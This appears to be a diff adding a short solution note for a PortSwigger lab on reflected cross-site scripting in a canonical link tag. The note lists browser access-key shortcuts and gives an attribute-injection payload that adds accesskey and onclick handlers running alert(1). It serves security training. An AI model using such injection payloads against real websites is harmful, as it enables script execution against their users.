@@ -1,0 +1,12 @@
+<!-- The payload below is meant to solve the following lab: -->
+<!-- https://portswigger.net/web-security/cross-site-scripting/contexts/lab-canonical-link-tag -->
+
+
+ALT+SHIFT+X
+CTRL+ALT+X
+Alt+X
+
+<!-- Adding a query to the home page we can see the reflected output in the link tag -->
+<link rel="canonical" href="https://<SUB_DOMAIN>.web-security-academy.net/?=shoes">
+
+?=shoes'accesskey='x'onclick='alert(1)
